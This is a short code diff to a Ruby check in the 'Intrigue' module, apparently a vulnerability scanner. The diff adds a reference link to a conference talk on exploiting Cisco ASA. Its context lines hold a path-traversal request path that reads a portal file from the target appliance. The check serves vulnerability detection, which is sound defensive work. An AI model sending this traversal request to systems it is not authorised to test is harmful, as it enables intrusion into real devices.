@@ -25,6 +25,9 @@ module Intrigue
       
       require_enrichment
 
+      ###
+      ### https://conference.hitb.org/hitbsecconf2019ams/materials/D1T1%20-%20SeasCoASA%20-%20Exploiting%20a%20Small%20Leak%20in%20a%20Great%20Ship%20-%20Kaiyi%20Xu%20&%20Lily%20Tang.pdf
+
       vuln_path = "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
       body = http_get_body "#{_get_entity_name}#{vuln_path}"
       
